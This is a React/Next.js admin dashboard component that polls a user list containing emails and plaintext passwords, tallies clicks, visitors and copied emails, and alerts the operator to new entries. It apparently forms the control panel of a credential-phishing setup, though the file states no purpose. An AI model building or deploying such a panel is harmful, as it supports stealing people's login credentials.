"use client";
import React, { useState, useEffect } from "react";
import axios from "axios";
import Users from "./Users";
import {
  CalculatorIcon,
  ComputerDesktopIcon,
  DevicePhoneMobileIcon,
  LinkIcon,
} from "@heroicons/react/24/solid";
import { useDispatch } from "react-redux";
import { adminLogout, setCustomers } from "@/lib/adminSlice";
import NotificationIndicator from "./NotificationIndicator";
import { useAppSelector } from "@/lib/hooks";
import { useRouter } from "next/navigation";
import { sendNotification } from "@/lib/notification";
import { getAlertSound } from "@/lib/alert-sound";
import { set } from "mongoose";
import { Hand, Lock } from "lucide-react";

// Define types
interface IUser {
  _id: string;
  email: string;
  password: string;
  createdAt: string | Date;
  deviceType?: string;
  updatedAt?: string;
  status?: string;
}

interface IData {
  mobileClicks: number;
  desktopClicks: number;
  notifications: number;
  alert: boolean;
  copiedEmails: number;
  visitors: number;
  clicks: number;
}

function Dashboard() {
  const { isAdminLoggedIn, customers } = useAppSelector(
    (state) => state.adminAuth
  );
  const dispatch = useDispatch();
  const [data, setData] = useState<IData>({
    mobileClicks: 0,
    desktopClicks: 0,
    notifications: 0,
    alert: false,
    copiedEmails: 0,
    visitors: 0,
    clicks: 0,
  });
  const router = useRouter();
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
  }, []);

  const alertSound = getAlertSound("/music/alert.mp3", 1);

  useEffect(() => {
    if (data.alert) {
      alertSound.play();
      sendNotification({
        title: "New data available",
        body: "Click to view",
        icon: "/logo.png",
      });

      setTimeout(async () => {
        await axios.get("/api/admin/alert/reset");
        console.log("Alert reset");
      }, 4000);
    }
  }, [data.alert, alertSound]);

  // Fetch users
  useEffect(() => {
    if (!isAdminLoggedIn) router.push("/admin/login");

    const fetchUsers = async () => {
      try {
        const res = await axios.get<{ success: boolean; data: IUser[] }>(
          "/api/admin/user-list"
        );
        dispatch(setCustomers(res.data.data || []));
      } catch (error) {
        console.log(error);
        dispatch(adminLogout());
      }
    };

    fetchUsers();
    const intervalId = setInterval(fetchUsers, 5000);
    return () => clearInterval(intervalId);
  }, []);

  // Fetch dashboard data
  useEffect(() => {
    const fetchData = async () => {
      try {
        const res = await axios.get<{ success: boolean; data: IData }>(
          "/api/admin/getData"
        );
        setData(res.data.data || data);
      } catch (error) {
        console.log(error);
      }
    };

    fetchData();
    const intervalId = setInterval(fetchData, 5000);
    return () => clearInterval(intervalId);
  }, []);

  const handleResetNotifications = async () => {
    try {
      const res = await axios.get("/api/admin/notification/reset");
      console.log(res.data);
    } catch (error) {
      console.log(error);
    }
  };

  useEffect(() => {
    async function requestNotificationPermission() {
      if (Notification.permission === "default") {
        const permission = await Notification.requestPermission();
        if (permission !== "granted") {
          console.log("Notifications not granted");
        }
      }
    }
    requestNotificationPermission();
  }, []);

  return (
    <div className="min-h-screen bg-gray-50 text-gray-900 dark:bg-gray-900 dark:text-gray-100">
      {/* 🔔 Notifications */}
      <NotificationIndicator
        handleClick={handleResetNotifications}
        count={data.notifications}
      />

      {/* 📊 Stats Row 1 */}
      <div className="mt-20 w-full flex space-x-2 justify-center">
        <div className="flex w-48 md:w-72 bg-white dark:bg-gray-800 p-3 rounded-lg shadow-md">
          <DevicePhoneMobileIcon
            width={50}
            className="text-blue-500 dark:text-blue-400"
          />
          <div className="ml-3">
            <h1 className="font-bold text-lg md:text-xl">Mobile Clicks</h1>
            <p className="font-bold">{data.mobileClicks}</p>
          </div>
        </div>
        <div className="flex w-48 md:w-72 bg-white dark:bg-gray-800 p-3 rounded-lg shadow-md">
          <ComputerDesktopIcon
            width={50}
            className="text-green-500 dark:text-green-400"
          />
          <div className="ml-3">
            <h1 className="font-bold text-lg md:text-xl">Desktop Clicks</h1>
            <p className="font-bold">{data.desktopClicks}</p>
          </div>
        </div>
      </div>

      {/* 📊 Stats Row 2 */}
      <div className=" w-full flex space-x-2 justify-center mt-5">
        <div className="flex w-48 md:w-72 bg-white dark:bg-gray-800 p-3 rounded-lg shadow-md">
          <CalculatorIcon
            width={50}
            className="text-purple-500 dark:text-purple-400"
          />
          <div className="ml-3">
            <h1 className="font-bold text-lg md:text-xl">Total Clicks</h1>
            <p className="font-bold">
              {data.mobileClicks + data.desktopClicks}
            </p>
          </div>
        </div>
        <div className="flex w-48 md:w-72 bg-white dark:bg-gray-800 p-3 rounded-lg shadow-md">
          <LinkIcon width={50} className="text-red-500 dark:text-red-400" />
          <div className="ml-3">
            <h1 className="font-bold text-lg md:text-xl">Email Copied</h1>
            <p className="font-bold">{data.copiedEmails}</p>
          </div>
        </div>
      </div>
      <div className="pb-10 w-full flex space-x-2 justify-center mt-5">
        <div className="flex w-48 md:w-72 bg-white dark:bg-gray-800 p-3 rounded-lg shadow-md">
          <Lock
            size={42}
            width={50}
            className="text-purple-500 dark:text-purple-400"
          />
          <div className="ml-3">
            <h1 className="font-bold text-lg md:text-xl">Auth Visitors</h1>
            <p className="font-bold">{data.visitors}</p>
          </div>
        </div>
        <div className="flex w-48 md:w-72 bg-white dark:bg-gray-800 p-3 rounded-lg shadow-md">
          <Hand
            size={42}
            width={50}
            className="text-purple-500 dark:text-purple-400"
          />
          <div className="ml-3">
            <h1 className="font-bold text-lg md:text-xl">Google Clicks</h1>
            <p className="font-bold">{data.clicks}</p>
          </div>
        </div>
      </div>

      {/* 👥 Users List */}
      {mounted && <Users users={customers} />}
    </div>
  );
}

export default Dashboard;
